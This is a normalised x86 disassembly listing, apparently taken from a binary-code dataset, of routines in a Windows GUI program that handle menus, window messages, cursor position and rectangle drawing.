cmp [ ebx + 0x8 ] 0x12
jne r-xdata
test eax eax
jne r-xdata
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x1
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
jmp r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46d57c
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46d5e4
jmp r-xdata
call sub_403b20
jmp r-xdata
sub_474e34
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x1 ] al
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4747d4
mov [ esi ] eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ esi ] 0x0
setne al
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov ebx [ eax ]
call [ ebx + 0xf4 ]
mov [ esi ] eax
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
setne bl
mov eax [ esi ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
jmp r-xdata
sub_474eec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_474f67
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x31 ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474f6e
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47eb74
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
sub_474f74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_474e34
pop ecx
test al al
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x8 ]
call sub_47eb64
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_47508c
jmp r-xdata
call sub_464204
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
mov [ eax + 0x296 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4747d4
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4747d4
call sub_474eec
mov eax [ ebp - 0x8 ]
call sub_474eec
mov eax [ ebp - 0x8 ]
call sub_4193b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4747d4
pop edx
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
sub_4750a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
cmp bl al
je r-xdata
mov edx ebx
mov eax esi
call sub_481154
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x17c ]
sub_4750cc
push esi
push edi
mov esi eax
cmp edx [ esi + 0x2a8 ]
je r-xdata
pop edi
pop esi
retn
mov edi edx
mov [ esi + 0x2a8 ] edi
test edi edi
je r-xdata
mov [ edi + 0x2fc ] esi
mov dl [ edi + 0x248 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov eax [ esi + 0x2a8 ]
cmp [ eax + 0x23a ] 0x0
je r-xdata
mov eax [ esi + 0x2a8 ]
mov al [ eax + 0x289 ]
mov [ esi + 0x289 ] al
mov edx [ eax + 0x238 ]
mov [ esi + 0x238 ] edx
mov edx [ eax + 0x23c ]
mov [ esi + 0x23c ] edx
sub_475138
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp dl [ ebx + 0x248 ]
setne al
and al dl
mov [ esp ] al
mov eax ebx
call sub_48148c
cmp [ esp ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2b0 ] 0x0
je r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42c354
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax [ ebx + 0x2b0 ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4188d4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x138 ]
inc edi
dec esi
jne r-xdata
sub_4751b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x2c4 ] edx
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4752c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x174 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2f4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x2f4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2f4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_47eb64
cmp [ eax + 0x6a ] 0x0
je r-xdata
retn
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_47eddc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_47eb64
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x160 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
sub_4752ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4755e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_451f74
cmp [ esi + 0x296 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4755ea
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
cmp [ esi + 0x2c4 ] 0x0
je r-xdata
movzx eax [ ebx + 0x4 ]
add eax 0xfffffff3
cmp eax 0x21
ja r-xdata
mov ax [ ebx + 0x4 ]
add al 0xd0
sub al 0xa
jb r-xdata
mov al [ eax + lookup_table_47538d ]
jmp [ eax * 4 + jump_table_4753af ]
call sub_464204
test al 0x4
jne r-xdata
add al 0xf9
sub al 0x1a
jae r-xdata
xor edx edx
mov eax esi
call sub_474f74
jmp r-xdata
mov dl 0x1
mov eax esi
call sub_474f74
jmp r-xdata
mov eax esi
call sub_480a00
mov edx [ eax + 0x40 ]
mov eax esi
call sub_47508c
jmp r-xdata
mov eax esi
call sub_4809c8
mov edx [ eax + 0x40 ]
mov eax esi
call sub_47508c
jmp r-xdata
mov eax esi
call sub_4747d4
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax [ esi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
mov dx [ ebx + 0x4 ]
call sub_480800
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_4747d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
je r-xdata
cmp [ esi + 0x290 ] 0x0
je r-xdata
mov eax esi
call sub_4747d4
test eax eax
je r-xdata
mov eax [ edi + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
call sub_44b0ac
jmp r-xdata
xor eax eax
call sub_44add4
jmp r-xdata
mov eax esi
call sub_4747d4
mov edi eax
test [ edi + 0x31 ] 0x4
jne r-xdata
mov eax edi
call sub_47d670
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax edi
call sub_4193b8
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_47eb74
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov eax [ ebp - 0x1c ]
xor ecx ecx
pop edx
call sub_40911c
mov eax [ ebp - 0xc ]
mov cx [ r-xdata ]
mov dl 0x3
call sub_431c8c
dec eax
jne r-xdata
xor ecx ecx
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov edi eax
xor ecx ecx
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x2ac ]
push eax
push 0x0
push 0xb402
mov eax [ esi + 0x2c4 ]
call sub_4530b8
push eax
call PostMessageA
mov eax [ edi + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
mov eax [ esi + 0x210 ]
call sub_47d6b0
mov edx [ ebp - 0x4 ]
call sub_419a28
test edi edi
je r-xdata
mov eax esi
call sub_47b62c
sub_4755f6
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x296 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x3
sub_47561c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451fa0
cmp [ ebx + 0x296 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x2c4 ]
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x12
jne r-xdata
mov ax [ esi + 0x4 ]
add al 0xd0
sub al 0xa
jb r-xdata
mov eax [ ebx + 0x2c4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ edi + 0x2b0 ]
call sub_473364
mov dx [ esi + 0x4 ]
call sub_480800
test eax eax
je r-xdata
add al 0xf9
sub al 0x1a
jae r-xdata
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
sub_475694
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_4757ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_4246b4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_4246b4
mov edx [ ebp - 0x8 ]
pop eax
call sub_404444
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_424764
push eax
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_424764
pop edx
cmp dl al
jne r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4757b4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov edx [ esi ]
mov edx [ edx + 0x88 ]
cmp eax [ edx + 0x18 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_42479c
push eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_42479c
pop edx
cmp dl al
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x1c ]
mov edx [ esi ]
mov edx [ edx + 0x88 ]
cmp eax [ edx + 0x1c ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_424684
mov edi eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_424684
cmp edi eax
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_424728
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_424728
cmp ebx eax
je r-xdata
mov al 0x1
sub_4757c0
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_452614
push ebp
call sub_475694
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f0 ] al
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4034a4
pop esi
pop ecx
pop ebp
retn
sub_4757f0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_480fb0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ edi + 0x16c ]
cmp eax [ esi + 0x2f4 ]
jne r-xdata
cmp edi [ esi + 0x298 ]
jne r-xdata
xor eax eax
mov [ esi + 0x2f4 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x298 ] eax
sub_475848
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44b0f8
mov edi eax
call sub_4499f0
mov esi eax
cmp edi [ ebx + 0x298 ]
je r-xdata
mov eax edi
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579c8
lea edx [ esp + 0x8 ]
lea eax [ ebx + 0x29c ]
call sub_417284
test al al
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579c8
mov eax [ esp + 0x8 ]
mov [ ebx + 0x29c ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x298 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov edx edi
mov eax ebx
call sub_475bd8
cmp [ ebx + 0x298 ] 0x0
je r-xdata
cmp esi [ ebx + 0x298 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x298 ]
call sub_44da78
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x298 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x298 ]
call sub_44da78
sub_47592c
push ebx
push esi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ab44
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46ab30
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_475994
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_475ae2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_475848
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4747d4
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dc70
mov eax [ ebp - 0x4 ]
call sub_4747d4
call sub_47eb64
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dc70
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
lea ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4747d4
call sub_47eb64
mov eax [ eax + 0x7c ]
lea edx [ ebp - 0xc ]
call sub_449958
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d8d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47592c
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_475a8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420da8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475ae9
lea eax [ ebp - 0xc ]
call sub_404038
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_475af0
push ebx
push esi
push edi
mov esi edx
mov edi [ rw-data ]
mov edi [ edi ]
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push esi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ esi + 0x4 ] 0x12
je r-xdata
mov edx esi
mov eax edi
call sub_46cd10
test al al
jne r-xdata
mov edx esi
mov eax edi
call sub_46cc08
test al al
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
push esi
call TranslateMessage
push esi
call DispatchMessageA
cmp eax 0x108
ja r-xdata
xor ebx ebx
jmp r-xdata
sub_475b94
push ebx
mov ebx eax
mov eax ebx
call sub_472040
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_475bd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x298 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x298 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421248
mov edx ebx
call sub_421018
sub_475c0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47132c
mov dl 0x6
mov eax esi
call sub_44bd60
mov [ esi + 0x1cc ] 0x1
mov edx 0x2
mov eax esi
call sub_4715d4
lea edx [ esi + 0x80 ]
mov eax [ rw-data ]
call sub_405df8
mov dl 0x1
mov eax esi
call sub_4715f0
mov dl 0x3
mov eax esi
call sub_47160c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_475ca0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x1
push 0x0
push esi
call OffsetRect
push 0xfffffffc
push 0xfffffffe
push esi
call InflateRect
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
mov eax ebx
call sub_475d54
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax ebx
call sub_475d54
call sub_48254c
call sub_47f734
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov edx esi
mov eax ebx
call sub_470de0
pop esi
pop ebx
retn
sub_475d10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push 0x1
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
push 0xfffffffc
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov ecx ebx
mov edx esp
mov eax esi
call sub_470e44
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_475d6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_473760
mov eax [ edi + 0x50 ]
or eax [ r-xdata ]
mov [ edi + 0x50 ] eax
xor edx edx
mov eax edi
call sub_44c794
xor edx edx
mov eax edi
call sub_44bd60
mov dl 0x2
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x134 ]
xor edx edx
mov eax edi
call sub_4531d8
mov dl [ r-xdata ]
mov eax edi
call sub_42f204
mov dl 0x1
mov eax edi
call sub_42f22c
mov dl 0x1
mov eax edi
call sub_42f240
xor edx edx
mov eax edi
call sub_4818c4
xor edx edx
mov eax edi
call sub_48189c
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
add esp 0xfffffff0
call sub_40360c
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1024
call SystemParametersInfoA
test eax eax
je r-xdata
mov edx [ esi + 0x214 ]
mov eax edi
call sub_481450
mov eax edi
test bl bl
je r-xdata
cmp [ ebp - 0x4 ] 0x1
sbb edx edx
inc edx
mov eax edi
call sub_476e08
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_475e64
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x210 ]
test eax eax
je r-xdata
xor edx edx
mov eax esi
call sub_44c794
lea eax [ esi + 0x30c ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4737ec
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x18 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_475eac
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_481690
mov edi eax
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_480cd0
mov ebp eax
mov eax [ ebx + 0x16c ]
call sub_47f37c
test al al
je r-xdata
test edi edi
je r-xdata
mov al [ r-xdata ]
mov [ esp ] al
cmp [ esi + 0x295 ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_47f37c
test al al
je r-xdata
cmp [ esi + 0x295 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov eax ebp
call sub_47f37c
test al al
je r-xdata
mov ebx [ edi + 0x40 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov dl [ esp ]
mov eax ebx
call sub_478744
jmp r-xdata
test ebp ebp
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x140 ]
cmp eax [ ebx + 0x16c ]
je r-xdata
mov eax edi
call sub_47f37c
test al al
jne r-xdata
mov ebx [ ebp + 0x40 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov dl [ ebx + 0x1a8 ]
or dl [ r-xdata ]
mov eax ebx
call sub_478744
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
cmp eax [ ebx + 0x16c ]
je r-xdata
mov eax ebp
call sub_47f37c
test al al
jne r-xdata
mov al [ r-xdata ]
or al [ esp ]
mov [ esp ] al
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov dl [ ebx + 0x1a8 ]
or dl [ r-xdata ]
mov eax ebx
call sub_478744
mov al [ r-xdata ]
or al [ esp ]
mov [ esp ] al
sub_47601b
mov eax esi
call sub_482578
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
pop esi
retn
mov eax esi
call sub_4747d4
test eax eax
je r-xdata
mov eax esi
call sub_4747d4
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax esi
call sub_4747d4
mov eax [ eax + 0x40 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_476060
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x190 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x188 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45254c
pop esi
pop ebx
retn
sub_476090
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_473ce8
mov esi eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x184 ]
mov eax esi
pop esi
pop ebx
retn
mov eax [ esi + 0x16c ]
call sub_47f37c
test al al
je r-xdata
mov [ ebx + 0x294 ] 0x1
xor edx edx
mov eax esi
call sub_44c794
sub_4760f4
push ebx
mov ebx eax
mov eax ebx
call sub_47fd60
cmp [ ebx + 0x295 ] 0x0
